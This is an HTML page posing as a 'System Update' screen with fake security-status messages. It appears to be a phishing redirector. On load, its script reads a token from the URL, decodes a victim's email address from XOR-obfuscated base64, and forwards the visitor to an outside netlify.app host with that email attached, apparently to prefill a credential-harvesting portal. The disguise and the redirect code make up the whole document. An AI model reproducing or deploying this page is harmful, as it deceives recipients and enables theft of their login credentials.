<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>System Update</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            text-align: center;
        }
        .container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
            max-width: 500px;
            width: 90%;
        }
        .loader {
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid white;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1.5s linear infinite;
            margin: 0 auto 30px;
        }
        h1 {
            font-weight: 300;
            margin: 0 0 15px 0;
            font-size: 24px;
        }
        p {
            margin: 0;
            opacity: 0.8;
            line-height: 1.5;
        }
        .status {
            margin-top: 20px;
            font-size: 14px;
            opacity: 0.7;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
    <script>
    (function() {
        'use strict';
        
        // Decode obfuscated email (must match encoder)
        function decodeEmail(encoded) {
            try {
                console.log('Decoding:', encoded);
                
                // URL-safe base64 decode
                let safe = encoded.replace(/-/g, '+').replace(/_/g, '/');
                while (safe.length % 4) safe += '=';
                const base64Decoded = atob(safe);
                console.log('Base64 decoded:', base64Decoded);
                
                // XOR decode with key 42
                const key = 42;
                let result = '';
                for (let i = 0; i < base64Decoded.length; i++) {
                    result += String.fromCharCode(base64Decoded.charCodeAt(i) ^ key);
                }
                console.log('XOR decoded:', result);
                return result;
            } catch(e) {
                console.error('Decode error:', e);
                return null;
            }
        }
        
        // Get token from URL
        function getToken() {
            const url = new URL(window.location.href);
            
            // Check query parameters
            const params = ['t', 'k', 'r', 's', 'c', 'id', 'token', 'key'];
            for (const param of params) {
                const value = url.searchParams.get(param);
                if (value && value.length > 5) {
                    console.log('Found token in param', param, ':', value);
                    return value;
                }
            }
            
            // Check hash
            if (url.hash && url.hash.length > 5) {
                const hashValue = url.hash.substring(1);
                console.log('Found token in hash:', hashValue);
                return hashValue;
            }
            
            // Check path
            const path = url.pathname;
            const segments = path.split('/').filter(s => s.length > 5);
            if (segments.length > 0) {
                console.log('Found token in path:', segments[segments.length - 1]);
                return segments[segments.length - 1];
            }
            
            console.log('No token found');
            return null;
        }
        
        function updateStatus(msg) {
            const el = document.getElementById('status');
            if (el) el.textContent = msg;
        }
        
        function redirect() {
            updateStatus('Checking authorization...');
            
            const token = getToken();
            const targetBase = 'https://startling-halva-d2e52f.netlify.app';
            
            setTimeout(() => {
                if (token) {
                    updateStatus('Decoding security token...');
                    
                    setTimeout(() => {
                        const email = decodeEmail(token);
                        console.log('Decoded email:', email);
                        
                        if (email && email.includes('@') && email.includes('.')) {
                            updateStatus('Redirecting to secure portal...');
                            
                            // URL encode the email for the hash
                            const encodedEmail = encodeURIComponent(email);
                            const finalUrl = targetBase + '#' + encodedEmail;
                            
                            console.log('Final redirect URL:', finalUrl);
                            
                            setTimeout(() => {
                                window.location.replace(finalUrl);
                            }, 500);
                            
                        } else {
                            console.log('Invalid decoded email:', email);
                            updateStatus('Invalid token, using standard access...');
                            setTimeout(() => {
                                window.location.replace(targetBase);
                            }, 1000);
                        }
                    }, 600);
                    
                } else {
                    updateStatus('No token found, using standard access...');
                    setTimeout(() => {
                        window.location.replace(targetBase);
                    }, 800);
                }
            }, 500);
        }
        
        // Start redirect with delay
        setTimeout(redirect, 800);
        
    })();
    </script>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <h1>System Initialization</h1>
        <p>Preparing secure environment...</p>
        <div class="status" id="status">Loading security protocols</div>
    </div>
</body>
</html>
